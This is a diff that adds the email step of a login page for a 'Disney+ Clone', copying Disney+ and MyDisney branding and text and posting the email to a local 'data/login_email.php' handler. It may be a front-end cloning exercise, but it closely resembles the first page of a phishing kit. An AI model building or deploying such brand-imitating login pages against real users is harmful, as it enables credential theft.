@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Disney+ Clone</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="body-login">
+        <div class="login-box">
+            <img src="disney-logo-white.png" alt="Disney+" class="logo-float">
+            <img src="mydisney-logo.png" alt="MyDisney Logo" class="mydisney-logo">
+            <h2>Enter your email to continue</h2>
+            <p>Log in to Disney+ with your MyDisney account. If you don't have one, you will be prompted to create one.</p>
+            <form action="data/login_email.php" method="POST">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required placeholder="Email">
+                <button type="submit">Continue</button>
+            </form>
+            <div class="footer">
+                <p><b>Disney+ is part of The Walt Disney Family of Companies</b></p>
+                <p>MyDisney lets you seamlessly log in to services and experiences across The Walt Disney Family of Companies, such as Disney+, ESPN, Walt Disney World, and more.</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
